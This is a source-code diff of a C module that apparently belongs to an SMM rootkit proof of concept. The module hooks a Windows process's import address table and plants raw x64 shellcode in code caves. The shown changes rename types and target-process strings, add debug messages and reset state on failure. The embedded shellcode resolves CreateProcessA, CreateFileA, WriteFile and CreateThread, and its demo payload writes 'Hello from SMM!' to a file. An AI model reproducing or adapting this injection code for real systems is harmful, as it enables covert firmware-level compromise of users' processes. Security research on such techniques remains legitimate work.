@@ -1,5 +1,4 @@
 #include "WinUmdIATHook.h"
-#include "vmm.h"
 
 // From NtKernelTools.c
 extern WinCtx *winGlobal;
@@ -16,14 +15,13 @@ const UINT8 WinUmdIATShellCode[] = {
   0x00, 0x00, 0x00, 0xC0, 0xFF, 0x53, 0x20, 0x48, 0x8B, 0xF8, 0x48, 0x83, 0xF8, 0xFF, 0x74, 0x24,
   0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8D, 0x93, 0xBC, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9,
   0x48, 0x8B, 0xC8, 0x45, 0x8D, 0x41, 0x10, 0xFF, 0x53, 0x48, 0x48, 0x8B, 0xCF, 0xFF, 0x53, 0x18,
-  0xC6, 0x43, 0x08, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0xC3
-};
+  0xC6, 0x43, 0x08, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0xC3 };
 
 // these vars are needed between different stages, therefore
 // they are defined global
 static WinProc TargetProcess;
 static WinModule TargetModule;
-static VMMDLL_WIN_THUNKINFO_IAT oThunkInfoIAT;
+static PE_THUNKINFO_IAT oThunkInfoIAT;
 static UINT64 vaCodeCave;
 static UINT64 vaWriteCave;
 static WinUmdIATState currState;
@@ -37,7 +35,7 @@ static BOOLEAN WindowsUmdIATHookStage1()
   BOOLEAN verbose = FALSE;
   WinProc process;
 
-  if (!DumpSingleProcess(winGlobal, "smm_rootkit_te", &process, verbose))
+  if (!DumpSingleProcess(winGlobal, "smm_target.exe", &process, verbose))
   {
     return FALSE;
   }
@@ -48,7 +46,7 @@ static BOOLEAN WindowsUmdIATHookStage1()
     TargetProcess.process = process.process;
   }
 
-  TargetModule.name = "smm_TargetProcess.exe";
+  TargetModule.name = "smm_target.exe";
   if (!DumpSingleModule(winGlobal, &TargetProcess, &TargetModule, verbose))
   {
     SerialPrintStringDebug("Failed parsing the base exe module! \r\n");
@@ -74,7 +72,7 @@ static BOOLEAN WindowsUmdIATHookStage2()
   // Nullify variables that were possibly set last time
   vaCodeCave = 0;
   vaWriteCave = 0;
-  for (INT32 i = 0; i < sizeof(VMMDLL_WIN_THUNKINFO_IAT); i++)
+  for (INT32 i = 0; i < sizeof(PE_THUNKINFO_IAT); i++)
   {
     ((UINT8 *)&oThunkInfoIAT)[i] = 0;
   }
@@ -165,18 +163,17 @@ static BOOLEAN WindowsUmdIATHookStage2()
     return FALSE;
   }
 
-  // Set the xchg value to 0
-  // TODO: atomicity / mutex !
+  // TODO: atomicity / mutex with cmpxchg as in pcileech !
   ctx.CMPXCHG = 0;
   // Prepare configuration data (goes into rw- section)
-  ctx.fn.CloseHandle = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "CloseHandle");
-  ctx.fn.CreateFileA = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "CreateFileA");
-  ctx.fn.CreateProcessA = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "CreateProcessA");
-  ctx.fn.CreateThread = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "CreateThread");
-  ctx.fn.GetExitCodeProcess = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "GetExitCodeProcess");
-  ctx.fn.ReadFile = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "ReadFile");
-  ctx.fn.WriteFile = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "WriteFile");
-  ctx.fn.LocalAlloc = PE_GetProcAddress(&TargetProcess, &kernel32_dll, "LocalAlloc");
+  ctx.fn.CloseHandle = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CloseHandle");
+  ctx.fn.CreateFileA = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateFileA");
+  ctx.fn.CreateProcessA = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateProcessA");
+  ctx.fn.CreateThread = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateThread");
+  ctx.fn.GetExitCodeProcess = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "GetExitCodeProcess");
+  ctx.fn.ReadFile = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "ReadFile");
+  ctx.fn.WriteFile = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "WriteFile");
+  ctx.fn.LocalAlloc = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "LocalAlloc");
   // hardcoded name to make it ez
   p_memCpy((UINT64)ctx.ParamString1, (UINT64) "c:\\smm.txt", strlen("c:\\smm.txt") + 1, FALSE);
   p_memCpy((UINT64)ctx.ParamString2, (UINT64) "Hello from SMM!", strlen("Hello from SMM!") + 1, FALSE);
@@ -257,6 +254,8 @@ BOOLEAN WindowsUmdIATHook()
 
   case NO_PROCESS:
   {
+    SerialPrintStringDebug("\r\n==  Finding target process ... ==\r\n");
+
     // If we (still) can't find the process, bail out
     if (!WindowsUmdIATHookStage1())
     {
@@ -264,7 +263,7 @@ BOOLEAN WindowsUmdIATHook()
       break;
     }
 
-    SerialPrintStringDebug("\r\n== Starting IAT Hooking ==\r\n");
+    SerialPrintStringDebug("\r\n==  Found and dumped process! Starting IAT Hooking ==\r\n");
 
     // If the stage 2 succeeds, change the status so that
     // the execution is waited next time this func is entered
@@ -273,6 +272,11 @@ BOOLEAN WindowsUmdIATHook()
       SerialPrintStringDebug("\r\n== IAT Hooking done! Now waiting for execution :-) == \r\n\r\n");
       currState = WAITING_EXECUTION;
     }
+    else
+    {
+      currState = NO_PROCESS;
+    }
+    
     break;
   }
 
